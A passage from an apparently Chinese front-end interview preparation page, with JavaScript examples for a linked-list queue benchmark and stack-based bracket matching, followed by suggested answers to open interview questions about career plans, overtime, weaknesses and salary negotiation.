console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'length4'</span><span class="token punctuation">,</span> q<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'length5'</span><span class="token punctuation">,</span> q<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 性能测试</span>

<span class="token keyword">var</span> q1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'queue with list'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  q1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  q1<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'queue with list'</span><span class="token punctuation">)</span> <span class="token comment">// 12ms</span>

<span class="token comment">// 数组模拟入队出队</span>
<span class="token keyword">var</span> q2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'queue with array'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  q2<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment">// 入队</span>
<span class="token punctuation">}</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  q2<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 出队</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'queue with array'</span><span class="token punctuation">)</span> <span class="token comment">// 425ms</span>

<span class="token comment">// 结论：同样的计算量，用数组和链表实现相差很多，数据量越大相差越多</span>
</code></pre></div><h3 id="手写判断一个字符串-a-b-c-d-e-f-是否括号匹配"><a href="#手写判断一个字符串-a-b-c-d-e-f-是否括号匹配" class="header-anchor">#</a> 手写判断一个字符串&quot;{a(b[c]d)e}f&quot;是否括号匹配</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 判断是否括号匹配
 * @param str str
 */</span>
<span class="token keyword">function</span> <span class="token function">matchBracket</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> length <span class="token operator">=</span> str<span class="token punctuation">.</span>length
    <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>

    <span class="token keyword">const</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

    <span class="token keyword">const</span> leftSymbols <span class="token operator">=</span> <span class="token string">'{[('</span>
    <span class="token keyword">const</span> rightSymbols <span class="token operator">=</span> <span class="token string">'}])'</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> s <span class="token operator">=</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>leftSymbols<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 左括号，压栈</span>
            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>rightSymbols<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 右括号，判断栈顶（是否出栈）</span>
            <span class="token keyword">const</span> top <span class="token operator">=</span> stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isMatch</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> stack<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * 判断左右括号是否匹配
 * @param left 左括号
 * @param right 右括号
 */</span>
<span class="token keyword">function</span> <span class="token function">isMatch</span><span class="token punctuation">(</span><span class="token parameter">left<span class="token punctuation">,</span> right</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">===</span> <span class="token string">'{'</span> <span class="token operator">&amp;&amp;</span> right <span class="token operator">===</span> <span class="token string">'}'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">===</span> <span class="token string">'['</span> <span class="token operator">&amp;&amp;</span> right <span class="token operator">===</span> <span class="token string">']'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">===</span> <span class="token string">'('</span> <span class="token operator">&amp;&amp;</span> right <span class="token operator">===</span> <span class="token string">')'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>
  <span class="token keyword">return</span> <span class="token boolean">false</span>
<span class="token punctuation">}</span>

<span class="token comment">// 功能测试</span>
<span class="token comment">// const str = '{a(b[c]d)e}f'</span>
<span class="token comment">// console.log(matchBracket(str))</span>
</code></pre></div><blockquote><p>利用栈先进后出的思想实现括号匹配，时间复杂度<code>O(n)</code>，空间复杂度<code>O(n)</code></p></blockquote> <h2 id="_14-开放问题"><a href="#_14-开放问题" class="header-anchor">#</a> 14 开放问题</h2> <h3 id="面试结束面试官问你想了解什么"><a href="#面试结束面试官问你想了解什么" class="header-anchor">#</a> 面试结束面试官问你想了解什么</h3> <p>一定要问这三个问题</p> <ul><li>部门所做的产品和业务（赛道），产品的用量和规模（看产品是否核心）</li> <li>部门有多少人，有什么角色（问出部门是否规范）</li> <li>项目的技术栈（看技术栈是否老旧）</li></ul> <h3 id="工作中遇到过哪些项目难点-是如何解决的-2"><a href="#工作中遇到过哪些项目难点-是如何解决的-2" class="header-anchor">#</a> 工作中遇到过哪些项目难点，是如何解决的</h3> <p><strong>遇到问题要注意积累</strong></p> <ul><li>每个人都会遇到问题，总有几个问题让你头疼</li> <li>日常要注意积累，解决了问题要自己写文章复盘</li></ul> <p><strong>如果之前没有积累</strong></p> <ul><li>回顾一下半年之内遇到的难题</li> <li>思考当时解决方案，以及解决之后的效果</li> <li>写一篇文章记录一下，答案就有了</li></ul> <p><strong>答案模板</strong></p> <ul><li>描述问题：背景 + 现象 + 造成的影响</li> <li>问题如何被解决：分析 + 解决</li> <li>自己的成长：学到了什么 + 以后如何避免</li></ul> <p><strong>一个示例</strong></p> <ul><li>问题：编辑器只能回显JSON格式的数据，而不支持老版本的HTML格式</li> <li>解决：将老版本的HTML反解析成JSON格式即可解决</li> <li>成长：要考虑完整的输入输出 + 考虑旧版本用户 + 参考其他产品</li></ul> <h3 id="你未来发展怎么规划的"><a href="#你未来发展怎么规划的" class="header-anchor">#</a> 你未来发展怎么规划的</h3> <blockquote><p>我想在工作中再创新高，我希望在三年以内能够在我职业上做出点成绩，比如达到架构师，我希望能在公司做技术强的人之一，能够带领更多同事做的更好</p></blockquote> <h3 id="你期望加入一家什么样的公司"><a href="#你期望加入一家什么样的公司" class="header-anchor">#</a> 你期望加入一家什么样的公司</h3> <blockquote><p>业务好，赛道好，技术牛逼(抬高对方)，能够让自己更好的成长，我希望除了以上这些外，公司还要有发展空间，希望入职的这家公司我有用武之地(贬低自己)，未来我希望跟这家公司走的很远(稳定性)，我希望能成为这家公司的前端leader，引领前端团队，这也是我的目标。我感觉贵公司是我梦想中的公司</p></blockquote> <h3 id="平常除了开发还会做什么"><a href="#平常除了开发还会做什么" class="header-anchor">#</a> 平常除了开发还会做什么？</h3> <ul><li>有时间去看一下b站老师的分享，提高自己的认知，比如说看xx的分享</li> <li>报课学习成长</li> <li>如果面试官问，天天学习你不觉得无趣吗，你可以回复，也不会一天到晚都在学习，我也经常运动（足球、篮球）（不要回复其他兴趣看书啥的），人家就是想看你的团队协作性怎么样</li></ul> <h3 id="工作中遇到比较大的挑战"><a href="#工作中遇到比较大的挑战" class="header-anchor">#</a> 工作中遇到比较大的挑战</h3> <blockquote><p>技术难题困扰你很久</p></blockquote> <h3 id="怎么看待加班"><a href="#怎么看待加班" class="header-anchor">#</a> 怎么看待加班</h3> <blockquote><p>员工应该站在公司的角度适应公司的发展，看公司当前业务的需要，公司需要我就会加班，对公司有利我们就冲，我相信一个优秀的公司是合理安排员工的休息的时间的，也不是靠加班加出来的，也有规范的流程，当然该加班的时候还得加</p></blockquote> <h3 id="你最大的缺点"><a href="#你最大的缺点" class="header-anchor">#</a> 你最大的缺点</h3> <ul><li>比如你是做前端的，你可以说你对运维那块的部署相关不熟悉，经验还不足等等。你是做后端的，你可以说你对那些炫酷的页面交互不太熟悉。</li> <li>优秀案例：突出你好学的心态
<ul><li>以前因为工作的关系不常用xxx技术栈，在业余时间略有接触，但是理解还不够深。</li> <li>但是自从xxx后，我就买了有关的书籍和一些视频教学深度学习。</li> <li>每天都会下班后用一个小时的时间在掘金，CSDN等论坛活跃，阅读网友的文章。同时我也会把我自己的疑惑跟大家交流，大家一起进步，让我在这方面越来越熟</li></ul></li></ul> <h3 id="你觉得你有哪些不足之处"><a href="#你觉得你有哪些不足之处" class="header-anchor">#</a> 你觉得你有哪些不足之处</h3> <ul><li>我觉得自己在xx方面存在不足（不足限制在技术上聊，不要谈其他容易掉HR的坑里）</li> <li>但我已意识到并开始学习</li> <li>我估计在xx时间把这块给补齐</li></ul> <p><strong>要限定一个范围</strong></p> <ul><li>技术方面的</li> <li>非核心技术栈的，即有不足也无大碍</li> <li>些容易弥补的，后面才能“翻身”</li></ul> <p><strong>错误的示范</strong></p> <ul><li>我爱睡懒觉、总是迟到 —— 非技术方面</li> <li>我自学的 Vue ，但还没有实践过 —— 核心技术栈</li> <li>我不懂 React —— 技术栈太大，不容易弥补</li></ul> <p><strong>正确的示范</strong></p> <ul><li>脚手架，我还在学习中，还不熟练</li> <li>nodejs 还需要继续深入学习</li></ul> <h3 id="谈薪技巧"><a href="#谈薪技巧" class="header-anchor">#</a> 谈薪技巧</h3> <ul><li>要骑驴找马，不要裸辞</li> <li>有其他公司的<code>offer</code>比他们家的高（不要透露薪资，给hr一个盲盒开不了，因为薪资是公司保密的不能对外透露），但是我还是比较欣赏怎们家公司</li> <li>你期望的薪资是多少？我上家公司的总包是<code>40w</code>，我希望能够在这个基础上涨<code>1/3</code></li></ul></div> <!----> <div class="readMore-wrapper"><span class="readMore">阅读全文</span></div></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated:</span> <span class="time">6/9/2023, 12:27:22 PM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/FE-Interview-Questions/docs/base/improve.html" class="prev">进阶篇</a></span> <span class="next"><a href="/FE-Interview-Questions/docs/base/handwritten.html">手写篇</a>
      →
    </span></p></div>  <div class="location" data-v-491adebf><!----> <!----> <div class="el-tooltip item item" data-v-491adebf data-v-491adebf><img src="data:image/png;base64,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" class="pic" data-v-491adebf></div> <div class="el-tooltip item item" data-v-491adebf data-v-491adebf><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAE8AAABACAYAAABbYipTAAAAAXNSR0IArs4c6QAAB/pJREFUeF7tW32MXFUV/503r9MmtJGSQEQhQkIMHxG11qQSrTQpKolCVfygot01M/etUypSq/IHSeUPgxq14uJ07n1v3ZbGChaJ1I/EGGHVYqOI33VjqmlTRBsxaop1s7sz75jTzJB1OjPvvvvezE5lT7LZZN/5nXPPb8+9755z7yMsiTMD5Ix0AG7btm357OzsJXEcX9poNE4cO3bsxNTUVN3B1FBA+kaeUmoNM68jotcBuJqZLyWiC9ujZua/ADhBRL8B8Asimp6bm5uenJx8digY6jGIXMlTSm0AcBuANwG4JGPwBwAcMMbI76GUXMgLguA2Zn4fgLf0IcojAB5evnz5vePj47N9sO9sMhN5QRBcDeALzPxm5xHYA58kok9rrR+xh/RX05k8pdS7hLgcpmfaCL/i+/4d1Wr132mBees7kaeU+iSAnXkPJoW9I77vb6pWq39MgcldNTV5Q0Dc8yTEcbw+iqIf586KpcFU5A0Tca34iOgarfXvLePNVc2aPKXUhwHcl6v3HIwx85znea9eDAKtyKtUKlfV6/UfAjhrk9shftn0/gjA3wG8FcBlKTlq4f8G4AYAV1ngZQ28sVqtPm2hm5uKFXlKqa8C2JzklZmniGizMeavojs6OnphsVjc1dwDJsHluWyI72jhd+7cWTx58uTtzPz5JDAR3ae1/kiSXp7PE8kbGxsbieN40sYpEV2ntT68UDcIgm3M/KUkPDM/G4bhRe16pVLpWs/zfp2El+dE9EattWT9QCSRPKXUdwHcaDMaY0xHe0opTsJL1oZhKOXdWVIulx8nouuTbAA4aIy52UIvF5We5FUqlSvq9fpRW09E9M72CkAp9XEAn7Gw8RwRrWtf+Eul0vWe5z1ugReV/wC4ojXtLTHOaj3JSxF4awDPeJ43VqvVvi1/aAZ+J4CbLEd4xPO8uxbgX+N53tvSbMiJ6L1a64cs/WVS60leEASHpa3k4EHeev8C8AoHrECeZuZ/EtG1lvjjzHwcwDWe5x3QWm+1xGVSS8o8eWu+OJOH/MG/BDAVx/FB3/eP12o1IW1RpCt5IyMjK4rF4syijOpsp78FsD+O40ejKJpuboE2MvNGIpJG6/kAzvwQEUvWAmj9/ISZH1uxYsXh8fHxU3nG05U8pdSVAKbzdOZg6ztCmjFmf3MNvaVQKGxhZukb+intzRDRDxqNxt4oih5Oie2o3pW8IAjWMvOTeThxtHG3MeZTglVKlQBsAfB6R1vtsEMA9hpjoiz2upJXqVRW1uv157IYd8US0Sat9aPlcvlVRCStr02uthJw32Tme8Iw/JWL/aQXxh8AvNzFsCuGiLZorR9QSkmpJcTJWtZPkV3BPcaYL6Z1krRVeYSZ357WqKs+EdW01h9SSn0UwOdc7Tji7kxLYFLmSWUgFcIg5EFjzK3lcvmDRDQxCIftPph5NAzDPba+kzJvPTNLK6rfctzzvA2NRuMlRPREv531sh/H8YYoiqZsxmDTGPg+gI02xlx1Wv9xpdQ3ALzD1U4euF4Ninb7NuTJNiHMY2CdbBDRHq31qFJK+oXSN0ySQ8w8QUTSZL1FSrIkADPXiOgxAHLiJz9JIi8QOeTqKYnkNbcsvwPwsiRjLs+l8JdGgFLqZwBe28tGp6xIancx83gYhnKEcEaUUtKokCPTnlIoFK7cvXu37Da6SiJ5TYdSaN+f5DDtcyKamZ2dvaBYLK4H8L0kfKf1KOlQqlOP0bI/+AljzGczkycGyuXyXiL6QFKAKZ9/yxhzk1LqQQDvScIOMvOY+YkwDHtWNFaZtyDlpdaVmjcXIaK7mFmm0FwKg4NY81rDOc8YIw3WjpKKvOYU/geA1SmC7aX6bgBSZ8qJ2dCJ53lrarWatMDyIa9J4Nct31o9CYnjeK3v+7NxHEvLaeiEmW8Nw1CWlPzIaxJoezbRlZRCoXDB/Pz8K1OcUQya4J5bltTTduHoy+Xy+4noAdeI5ufnLyoUChfbHi26+nHFJZVrmcgrlUpyQPNz18HJ1sP3/aNxHP/Z1UY/cUmlWibylFJa9p2uATDz1pUrV06ePn266xvN1XYeOM/zLu91RpKVvG6H2XsBvAiAHFR37ccxczUMw61KKWkGXJdHwDnaeMoYs7aXPWfyukzZh3zfv3vhpcNmN1hIlAveq4lodRzHz2915JZAiro2R24STQXGGNMX8tqm7P5Go3HvxMSE1MCppXlSJ3fsLk8N7g8gMevErXPmSUHOzHuY+f4oip7KGkMQBNttbkNl9WOJT8w6Z/KaU9Y3xvzUcjBWakopaQ7INxyLKV82xtxuMwDnzLMxnlYnCIJBda67DW3aGCOfR1jJUJEnI17MMwzf9y+uVqsnrZjLsubZOnDRW6TTs3Vpl6Ghy7wW2QM8t/1THMc3RFF0LO0/emjJa07hft8YODgzM7N53759p9MS5/y2dXGUBdOHuyqt4RwyxrzBdWxDnXntQZVKpSy3pDpy1O0etQ2h5xR5rYAW3s8DsKb5rUd7Df0MMx8lIvk+7cxvZpabpv/zzRwz3xyG4UEbstp1zknyOgU6MjJy/rJlyy5j5njVqlVHd+3a1fFi5o4dO847derUx1okEtHXtNaJ35h08vl/Q17azBkbG3tpo9HYTkTbXafuC5a8FtnywTUzr0q7xztn3rZps2pQ+i/4zMtC9BJ5GdhbIm+JvAwMZIAuZd4SeRkYyABdyrwl8jIwkAH6X0lrBW4THmvNAAAAAElFTkSuQmCC" class="pic" data-v-491adebf></div> <a href="http://nav.poetries.top" target="_blank" data-v-491adebf><div class="el-tooltip item item" data-v-491adebf data-v-491adebf><img src="data:image/png;base64,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" class="pic" data-v-491adebf></div></a> <!----> <div class="el-tooltip item item" style="display:none;" data-v-491adebf data-v-491adebf><img 